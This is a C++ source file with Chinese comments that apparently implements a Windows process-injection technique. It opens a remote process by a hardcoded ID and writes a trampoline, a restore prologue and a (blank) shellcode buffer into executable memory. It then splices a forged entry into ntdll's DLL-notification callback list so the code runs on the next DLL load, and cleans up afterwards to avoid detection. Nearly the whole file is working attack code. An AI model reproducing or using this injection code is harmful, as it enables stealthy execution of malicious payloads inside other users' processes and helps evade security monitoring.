#include <Windows.h>
#include <stdio.h>
#include "nt.h"
#include <cstdint>

// 回调函数
VOID DummyCallback(ULONG NotificationReason, const PLDR_DLL_NOTIFICATION_DATA NotificationData, PVOID Context)
{
    return;
}


PLIST_ENTRY GetDllNotificationListHead() {
    PLIST_ENTRY head = 0;


    HMODULE hNtdll = GetModuleHandleA("NTDLL.dll");

    if (hNtdll != NULL) {

        // 找到LdrRegisterDllNotification函数
        _LdrRegisterDllNotification pLdrRegisterDllNotification = (_LdrRegisterDllNotification)GetProcAddress(hNtdll, "LdrRegisterDllNotification");

        // 找到 LdrUnregisterDllNotification函数
        _LdrUnregisterDllNotification pLdrUnregisterDllNotification = (_LdrUnregisterDllNotification)GetProcAddress(hNtdll, "LdrUnregisterDllNotification");

        // 将回调函数注册为 DLL 通知回调
        PVOID cookie;
        NTSTATUS status = pLdrRegisterDllNotification(0, (PLDR_DLL_NOTIFICATION_FUNCTION)DummyCallback, NULL, &cookie);
        if (status == 0) {
            printf("[+] Successfully registered dummy callback\n");

            // Cookie is the last callback registered so its Flink holds the head of the list.
            head = ((PLDR_DLL_NOTIFICATION_ENTRY)cookie)->List.Flink;
            printf("[+] Found LdrpDllNotificationList head: %p\n", head);

            // 卸载回调函数
            status = pLdrUnregisterDllNotification(cookie);
            if (status == 0) {
                printf("[+] Successfully unregistered dummy callback\n");
            }
        }
    }

    return head;
}

LPVOID GetNtdllBase(HANDLE hProc) {

    // 找到 NtQueryInformationProcess函数
    NtQueryInformationProcess pNtQueryInformationProcess = (NtQueryInformationProcess)GetProcAddress((HMODULE)GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");

    // 获取远程进程的PEB
    PROCESS_BASIC_INFORMATION info;
    NTSTATUS status = pNtQueryInformationProcess(hProc, ProcessBasicInformation, &info, sizeof(info), 0);
    ULONG_PTR ProcEnvBlk = (ULONG_PTR)info.PebBaseAddress;

    // 读取远程Ldr的地址指针
    ULONG_PTR ldrAddress = 0;
    BOOL res = ReadProcessMemory(hProc, ((char*)ProcEnvBlk + offsetof(_PEB, pLdr)), &ldrAddress, sizeof(ULONG_PTR), nullptr);

    // 读取远程 InLoadOrderModuleList头的地址
    ULONG_PTR ModuleListAddress = 0;
    res = ReadProcessMemory(hProc, ((char*)ldrAddress + offsetof(PEB_LDR_DATA, InLoadOrderModuleList)), &ModuleListAddress, sizeof(ULONG_PTR), nullptr);

    //读取远程 InLoadOrderModuleList中的第一个LDR_DATA_TABLE_ENTRY条目
    LDR_DATA_TABLE_ENTRY ModuleEntry = { 0 };
    res = ReadProcessMemory(hProc, (LPCVOID)ModuleListAddress, &ModuleEntry, sizeof(LDR_DATA_TABLE_ENTRY), nullptr);

    LIST_ENTRY* ModuleList = (LIST_ENTRY*)&ModuleEntry;
    WCHAR name[1024];
    ULONG_PTR nextModuleAddress = 0;

    LPWSTR sModuleName = (LPWSTR)L"ntdll.dll";

    // 通过读取远程 InLoadOrderModuleList中的第一个 LDR_DATA_TABLE_ENTRY条目开始遍历查找
    for (ReadProcessMemory(hProc, (LPCVOID)ModuleListAddress, &ModuleEntry, sizeof(LDR_DATA_TABLE_ENTRY), nullptr);
        // 当捕获到最后一个条目时停止
        (ULONG_PTR)(ModuleList->Flink) != ModuleListAddress;
        //读取list中下一个条目
        ReadProcessMemory(hProc, (LPCVOID)nextModuleAddress, &ModuleEntry, sizeof(LDR_DATA_TABLE_ENTRY), nullptr))
    {

        //将 dll name的缓冲区清零
        memset(name, 0, sizeof(name));

        // 将远程BaseDllName（UNICODE_STRING）的缓冲区读入缓冲区“name”
        ReadProcessMemory(hProc, (LPCVOID)ModuleEntry.BaseDllName.pBuffer, &name, ModuleEntry.BaseDllName.Length, nullptr);

        // 检查当前模块的名称是否为ntdll.dll，如果是，则返回DllBase地址
        if (wcscmp(name, sModuleName) == 0) {
            return (LPVOID)ModuleEntry.DllBase;
        }

        // 否则，设置 nextModuleAddress 为指向list中的下一个entry条目
        ModuleList = (LIST_ENTRY*)&ModuleEntry;
        nextModuleAddress = (ULONG_PTR)(ModuleList->Flink);
    }
    return 0;
}

void PrintDllNotificationList(HANDLE hProc, LPVOID remoteHeadAddress) {
    printf("\n");
    printf("[+] Remote DLL Notification Block List:\n");

    // 为LDR_DLL_NOTIFICATION_ENTRY分配内存
    BYTE* entry = (BYTE*)malloc(sizeof(LDR_DLL_NOTIFICATION_ENTRY));

    // 从远程进程中读取其头部条目
    ReadProcessMemory(hProc, remoteHeadAddress, entry, sizeof(LDR_DLL_NOTIFICATION_ENTRY), nullptr);
    LPVOID currentEntryAddress = remoteHeadAddress;
    do {

        // 打印 LDR_DLL_NOTIFICATION_ENTRY 及其回调函数的地址
        printf("    0x%p -> 0x%p\n", currentEntryAddress, ((PLDR_DLL_NOTIFICATION_ENTRY)entry)->Callback);

        // 获取list中下一个回调的地址
        currentEntryAddress = ((PLDR_DLL_NOTIFICATION_ENTRY)entry)->List.Flink;

        // 读取list中的下一个回调
        ReadProcessMemory(hProc, currentEntryAddress, entry, sizeof(LDR_DLL_NOTIFICATION_ENTRY), nullptr);

    } while ((PLIST_ENTRY)currentEntryAddress != remoteHeadAddress); // 当再次到达列表的头部时停止

    free(entry);

    printf("\n");
}

BOOL MaskCompare(const BYTE* pData, const BYTE* bMask, const char* szMask)
{
    for (; *szMask; ++szMask, ++pData, ++bMask)
        if (*szMask == 'x' && *pData != *bMask)
            return FALSE;
    return TRUE;
}

DWORD_PTR FindPattern(DWORD_PTR dwAddress, DWORD dwLen, PBYTE bMask, PCHAR szMask)
{
    for (DWORD i = 0; i < dwLen; i++)
        if (MaskCompare((PBYTE)(dwAddress + i), bMask, szMask))
            return (DWORD_PTR)(dwAddress + i);

    return 0;
}

unsigned char shellcode[276] = { };

unsigned char restore[] = {
    0x41, 0x56,                                                      // push r14
    0x49, 0xBE, 0x88, 0x77, 0x66, 0x55, 0x44, 0x33, 0x22, 0x11,      // move r14, 0x1122334455667788
    0x41, 0xC7, 0x06, 0x44, 0x33, 0x22, 0x11,                        // mov dword [r14], 0x11223344
    0x41, 0xC7, 0x46, 0x04, 0x44, 0x33, 0x22, 0x11,                  // mov dword [r14+4], 0x11223344
    0x49, 0xBE, 0x88, 0x77, 0x66, 0x55, 0x44, 0x33, 0x22, 0x11,      // move r14, 0x1122334455667788
    0x41, 0xC7, 0x06, 0x44, 0x33, 0x22, 0x11,                        // mov dword [r14], 0x11223344
    0x41, 0xC7, 0x46, 0x04, 0x44, 0x33, 0x22, 0x11,                  // mov dword [r14+4], 0x11223344
    0x41, 0x5e,                                                      // pop r14
};

// Trampoline shellcode for creating TpAllocWork for our restore prologue and malicious shellcode
// Created using https://github.com/Cracked5pider/ShellcodeTemplate
unsigned char trampoline[] = { 0x56, 0x48, 0x89, 0xe6, 0x48, 0x83, 0xe4, 0xf0, 0x48, 0x83, 0xec, 0x20, 0xe8, 0xf, 0x0, 0x0, 0x0, 0x48, 0x89, 0xf4, 0x5e, 0xc3, 0x66, 0x2e, 0xf, 0x1f, 0x84, 0x0, 0x0, 0x0, 0x0, 0x0, 0x41, 0x55, 0xb9, 0xf0, 0x1d, 0xd3, 0xad, 0x41, 0x54, 0x57, 0x56, 0x53, 0x31, 0xdb, 0x48, 0x83, 0xec, 0x30, 0xe8, 0xf9, 0x0, 0x0, 0x0, 0xb9, 0x53, 0x17, 0xe6, 0x70, 0x49, 0x89, 0xc5, 0xe8, 0xec, 0x0, 0x0, 0x0, 0x49, 0x89, 0xc4, 0x4d, 0x85, 0xed, 0x74, 0x10, 0xba, 0xda, 0xb3, 0xf1, 0xd, 0x4c, 0x89, 0xe9, 0xe8, 0x28, 0x1, 0x0, 0x0, 0x48, 0x89, 0xc3, 0x4d, 0x85, 0xe4, 0x74, 0x32, 0x4c, 0x89, 0xe1, 0xba, 0x37, 0x8c, 0xc5, 0x3f, 0xe8, 0x13, 0x1, 0x0, 0x0, 0x4c, 0x89, 0xe1, 0xba, 0xb2, 0x5a, 0x91, 0x4d, 0x48, 0x89, 0xc7, 0xe8, 0x3, 0x1, 0x0, 0x0, 0x4c, 0x89, 0xe1, 0xba, 0x4d, 0xff, 0xa9, 0x27, 0x48, 0x89, 0xc6, 0xe8, 0xf3, 0x0, 0x0, 0x0, 0x49, 0x89, 0xc4, 0xeb, 0x7, 0x45, 0x31, 0xe4, 0x31, 0xf6, 0x31, 0xff, 0x45, 0x31, 0xc9, 0x45, 0x31, 0xc0, 0x48, 0x8d, 0x4c, 0x24, 0x28, 0x48, 0xba, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x48, 0xc7, 0x44, 0x24, 0x28, 0x0, 0x0, 0x0, 0x0, 0xff, 0xd7, 0x48, 0x8b, 0x4c, 0x24, 0x28, 0xff, 0xd6, 0x48, 0x8b, 0x4c, 0x24, 0x28, 0x41, 0xff, 0xd4, 0xba, 0x0, 0x10, 0x0, 0x0, 0x48, 0x83, 0xc9, 0xff, 0xff, 0xd3, 0x48, 0x83, 0xc4, 0x30, 0x5b, 0x5e, 0x5f, 0x41, 0x5c, 0x41, 0x5d, 0xc3, 0x49, 0x89, 0xd1, 0x49, 0x89, 0xc8, 0xba, 0x5, 0x15, 0x0, 0x0, 0x8a, 0x1, 0x4d, 0x85, 0xc9, 0x75, 0x6, 0x84, 0xc0, 0x75, 0x16, 0xeb, 0x2f, 0x41, 0x89, 0xca, 0x45, 0x29, 0xc2, 0x4d, 0x39, 0xca, 0x73, 0x24, 0x84, 0xc0, 0x75, 0x5, 0x48, 0xff, 0xc1, 0xeb, 0x7, 0x3c, 0x60, 0x76, 0x3, 0x83, 0xe8, 0x20, 0x41, 0x89, 0xd2, 0xf, 0xb6, 0xc0, 0x48, 0xff, 0xc1, 0x41, 0xc1, 0xe2, 0x5, 0x44, 0x1, 0xd0, 0x1, 0xc2, 0xeb, 0xc4, 0x89, 0xd0, 0xc3, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x57, 0x56, 0x48, 0x89, 0xce, 0x53, 0x48, 0x83, 0xec, 0x20, 0x65, 0x48, 0x8b, 0x4, 0x25, 0x60, 0x0, 0x0, 0x0, 0x48, 0x8b, 0x40, 0x18, 0x48, 0x8b, 0x78, 0x20, 0x48, 0x89, 0xfb, 0xf, 0xb7, 0x53, 0x48, 0x48, 0x8b, 0x4b, 0x50, 0xe8, 0x85, 0xff, 0xff, 0xff, 0x89, 0xc0, 0x48, 0x39, 0xf0, 0x75, 0x6, 0x48, 0x8b, 0x43, 0x20, 0xeb, 0x11, 0x48, 0x8b, 0x1b, 0x48, 0x85, 0xdb, 0x74, 0x5, 0x48, 0x39, 0xdf, 0x75, 0xd9, 0x48, 0x83, 0xc8, 0xff, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0x5e, 0x5f, 0xc3, 0x41, 0x57, 0x41, 0x56, 0x49, 0x89, 0xd6, 0x41, 0x55, 0x41, 0x54, 0x55, 0x31, 0xed, 0x57, 0x56, 0x53, 0x48, 0x89, 0xcb, 0x48, 0x83, 0xec, 0x28, 0x48, 0x63, 0x41, 0x3c, 0x8b, 0xbc, 0x8, 0x88, 0x0, 0x0, 0x0, 0x48, 0x1, 0xcf, 0x44, 0x8b, 0x7f, 0x20, 0x44, 0x8b, 0x67, 0x1c, 0x44, 0x8b, 0x6f, 0x24, 0x49, 0x1, 0xcf, 0x39, 0x6f, 0x18, 0x76, 0x31, 0x89, 0xee, 0x31, 0xd2, 0x41, 0x8b, 0xc, 0xb7, 0x48, 0x1, 0xd9, 0xe8, 0x15, 0xff, 0xff, 0xff, 0x4c, 0x39, 0xf0, 0x75, 0x18, 0x48, 0x1, 0xf6, 0x48, 0x1, 0xde, 0x42, 0xf, 0xb7, 0x4, 0x2e, 0x48, 0x8d, 0x4, 0x83, 0x42, 0x8b, 0x4, 0x20, 0x48, 0x1, 0xd8, 0xeb, 0x4, 0xff, 0xc5, 0xeb, 0xca, 0x48, 0x83, 0xc4, 0x28, 0x5b, 0x5e, 0x5f, 0x5d, 0x41, 0x5c, 0x41, 0x5d, 0x41, 0x5e, 0x41, 0x5f, 0xc3, 0x90, 0x90, 0x90, 0xe8, 0x0, 0x0, 0x0, 0x0, 0x58, 0x48, 0x83, 0xe8, 0x5, 0xc3, 0xf, 0x1f, 0x44, 0x0 };

int main()
{
    // 获取本地LdrpDllNotificationList头地址
    LPVOID localHeadAddress = (LPVOID)GetDllNotificationListHead();
    printf("[+] Local LdrpDllNotificationList head address: 0x%p\n", localHeadAddress);

    // 获取本地NTDLL基准地址
    HANDLE hNtdll = GetModuleHandleA("NTDLL.dll");
    printf("[+] Local NTDLL base address: 0x%p\n", hNtdll);

    // 计算 LdrpDllNotificationList 相对于 NTDLL 基址的偏移量
    int offsetFromBase = (BYTE*)localHeadAddress - (BYTE*)hNtdll;
    printf("[+] LdrpDllNotificationList offset from NTDLL base: 0x%X\n", offsetFromBase);

    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 4844);
    printf("[+] Got handle to remote process\n");

    // 获取远程NTDLL基地址
    LPVOID remoteNtdllBase = GetNtdllBase(hProc);
    LPVOID remoteHeadAddress = (BYTE*)remoteNtdllBase + offsetFromBase;
    printf("[+] Remote LdrpDllNotificationList head address 0x%p\n", remoteHeadAddress);

    // 打印远程 Dll 通知列表
    PrintDllNotificationList(hProc, remoteHeadAddress);

    // 在目标进程中为trampoline + restore prologue + shellcode分配内存
    LPVOID trampolineEx = VirtualAllocEx(hProc, 0, sizeof(restore) + sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    printf("[+] Allocated memory for restore trampoline + prologue + shellcode in remote process\n");
    printf("[+] Trampoline address in remote process: 0x%p\n", trampolineEx);

    // 偏移trampoline块的大小来获得恢复序言地址
    LPVOID restoreEx = (BYTE*)trampolineEx + sizeof(trampoline);
    printf("[+] Restore prologue address in remote process: 0x%p\n", restoreEx);

    // 偏移trampoline + restore prologue块的大小来获取shellcode地址
    LPVOID shellcodeEx = (BYTE*)trampolineEx + sizeof(trampoline) + sizeof(restore);
    printf("[+] Shellcode address in remote process: 0x%p\n", shellcodeEx);

    // 在trampoline shellcode中找到restorex占位符
    LPVOID restoreExInTrampoline = (LPVOID)FindPattern((DWORD_PTR)&trampoline, sizeof(trampoline), (PBYTE)"\x11\x11\x11\x11\x11\x11\x11\x11", (PCHAR)"xxxxxxxx");

    // 用restore prologue的地址覆写restoreEx占位符
    memcpy(restoreExInTrampoline, &restoreEx, 8);

    // 将trampoline shellcode写入目标进程
    WriteProcessMemory(hProc, trampolineEx, trampoline, sizeof(trampoline), nullptr);
    printf("[+] trampoline has been written to remote process: 0x%p\n", trampolineEx);

    // 将shellcode写入远程目标进程中
    WriteProcessMemory(hProc, shellcodeEx, shellcode, sizeof(shellcode), nullptr);
    printf("[+] Shellcode has been written to remote process: 0x%p\n", shellcodeEx);

    // 创建一个新的LDR_DLL_NOTIFICATION_ENTRY条目
    LDR_DLL_NOTIFICATION_ENTRY newEntry = {};
    newEntry.Context = NULL;

    // 设置 Callback 属性指向 trampoline shellcode
    newEntry.Callback = (PLDR_DLL_NOTIFICATION_FUNCTION)trampolineEx;

    // 希望新条目成为列表中的第一个，所以新条目的List.Blink属性应该指向列表的头部
    newEntry.List.Blink = (PLIST_ENTRY)remoteHeadAddress;

    // 为LDR_DLL_NOTIFICATION_ENTRY分配内存缓冲区
    BYTE* remoteHeadEntry = (BYTE*)malloc(sizeof(LDR_DLL_NOTIFICATION_ENTRY));

    // 从目标进程中读取头条目
    ReadProcessMemory(hProc, remoteHeadAddress, remoteHeadEntry, sizeof(LDR_DLL_NOTIFICATION_ENTRY), nullptr);

    // 设置新条目的 List.Flink 属性为指向list中原来第一个条目
    newEntry.List.Flink = ((PLDR_DLL_NOTIFICATION_ENTRY)remoteHeadEntry)->List.Flink;

    // 为新条目分配内存空间
    LPVOID newEntryAddress = VirtualAllocEx(hProc, 0, sizeof(LDR_DLL_NOTIFICATION_ENTRY), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    printf("[+] Allocated memory for new entry in remote process: 0x%p\n", newEntryAddress);

    // 将新条目写入远程目标进程中
    WriteProcessMemory(hProc, (BYTE*)newEntryAddress, &newEntry, sizeof(LDR_DLL_NOTIFICATION_ENTRY), nullptr);
    printf("[+] New entry has been written to remote process: 0x%p\n", newEntryAddress);

    // 用新条目的地址计算我们需要覆写的地址
    // 上一个条目的 Flink（头）和下一个条目的 Blink（原第一个条目）
    LPVOID previousEntryFlink = (LPVOID)((BYTE*)remoteHeadAddress + offsetof(LDR_DLL_NOTIFICATION_ENTRY, List) + offsetof(LIST_ENTRY, Flink));
    LPVOID nextEntryBlink = (LPVOID)((BYTE*)((PLDR_DLL_NOTIFICATION_ENTRY)remoteHeadEntry)->List.Flink + offsetof(LDR_DLL_NOTIFICATION_ENTRY, List) + offsetof(LIST_ENTRY, Blink));

    // 定义一个需要覆写的原始值的缓冲区
    unsigned char originalValue[8] = {};

    // 读取上一个条目的Flink（头）的原始值
    ReadProcessMemory(hProc, previousEntryFlink, &originalValue, 8, nullptr);
    memcpy(&restore[4], &previousEntryFlink, 8); // Set address to restore for previous entry's Flink (head)
    memcpy(&restore[15], &originalValue[0], 4); // Set the value to restore (1st half of value)
    memcpy(&restore[23], &originalValue[4], 4); // Set the value to restore (2nd half of value)

    // 读取下一个条目的Blink的原始值（原第一个条目）
    ReadProcessMemory(hProc, nextEntryBlink, &originalValue, 8, nullptr);
    memcpy(&restore[29], &nextEntryBlink, 8); // Set address to restore for next entry's Blink (original 1st entry)
    memcpy(&restore[40], &originalValue[0], 4); // Set the value to restore (1st half of value)
    memcpy(&restore[48], &originalValue[4], 4); // Set the value to restore (2nd half of value)

    // 将恢复序（restore prologue）写入远程目标进程
    WriteProcessMemory(hProc, restoreEx, restore, sizeof(restore), nullptr);
    printf("[+] Restore prologue has been written to remote process: 0x%p\n", restoreEx);

    // 用我们新条目的地址覆写上一个条目的 Flink（头）
    WriteProcessMemory(hProc, previousEntryFlink, &newEntryAddress, 8, nullptr);

    // 用新条目的地址覆写下一个条目的 Blink（原第一个条目）
    WriteProcessMemory(hProc, nextEntryBlink, &newEntryAddress, 8, nullptr);

    printf("[+] LdrpDllNotificationList has been modified.\n");
    printf("[+] Our new entry has been inserted.\n");

    PrintDllNotificationList(hProc, remoteHeadAddress);
}
